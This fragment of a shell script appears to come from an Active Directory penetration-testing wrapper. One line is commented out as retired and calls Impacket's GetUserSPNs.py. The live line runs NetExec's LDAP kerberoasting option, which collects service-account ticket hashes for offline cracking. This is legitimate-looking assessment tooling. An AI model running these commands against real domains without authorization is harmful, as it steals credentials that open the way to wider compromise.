	# Retired GetUserSPNs.py
	#printOrExecute "$IMPACKETSCRIPTS/GetUserSPNs.py  -request '$DOMAIN/$USERNAME:$PASSWORD' -dc-ip '$DCIP' -target-domain '$TARGETDOMAIN' | tee '$OUTPUTDIR/userSPNs.out'" "$MODE"
	printOrExecute "$NETEXEC ldap '$DCIP' -u '$DOMAIN\\$USERNAME' -p '$PASSWORD' -d '$TARGETDOMAIN' --kerberoasting '$OUTPUTDIR/nxc_kerberoasting.out' --threads $NETEXECTHREADS" "$MODE" "nxc_kerberoasting.log"
